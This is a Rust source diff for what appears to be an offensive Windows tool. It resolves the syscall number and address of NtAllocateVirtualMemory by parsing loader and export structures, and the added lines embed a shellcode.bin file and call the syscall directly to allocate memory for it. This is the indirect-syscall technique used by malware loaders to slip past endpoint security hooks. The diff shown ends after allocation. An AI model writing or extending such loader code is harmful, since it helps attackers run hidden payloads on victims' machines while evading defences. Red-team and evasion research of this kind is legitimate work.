@@ -8,10 +8,13 @@ use std::{
 use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
 use windows_sys::Win32::System::{
     Diagnostics::Debug::IMAGE_NT_HEADERS64,
+    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
     SystemServices::{
         IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
     },
 };
+
+const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
 
 global_asm!(
     ".section .data
@@ -191,4 +194,31 @@ fn main() {
         "[+] NtAllocateVirtualMemory syscall address: {:p}",
         syscall_addr
     );
+
+    let mut base_address: *mut c_void = null_mut();
+    let mut size = SHELLCODE.len();
+    unsafe {
+        SSN = ssn;
+        Syscall_Addr = syscall_addr;
+    }
+    let status = unsafe {
+        Sys_NtAllocateVirtualMemory(
+            -1isize as *mut c_void,
+            &mut base_address,
+            0,
+            &mut size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        )
+    };
+
+    if status != 0 {
+        println!(
+            "[-] NtAllocateVirtualMemory failed with status: 0x{:X}",
+            status
+        );
+        return;
+    }
+
+    println!("[+] Allocated {} bytes at {:p}", size, base_address);
 }
